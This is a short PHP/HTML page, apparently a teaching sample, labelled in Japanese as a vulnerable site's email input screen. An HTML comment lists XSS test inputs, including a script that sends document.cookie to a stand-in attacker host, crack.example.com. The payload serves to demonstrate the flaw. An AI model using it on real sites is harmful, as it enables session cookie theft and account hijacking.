<?php
session_start();
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>脆弱なサイトのメールアドレス入力画面</title>
</head>
<body>
<!--
 入力値：<script>window.location='http://crack.example.com/xss/crack.php?cookie='+document.cookie</script> 
 入力値：<script>alert('test')</script>
-->
<form name="inputform" action="confirm.php" method="GET">
  メールアドレス：<input type="text" name="mail"><br />
  <input type="submit" value="送信">
</form>
</body>
</html>
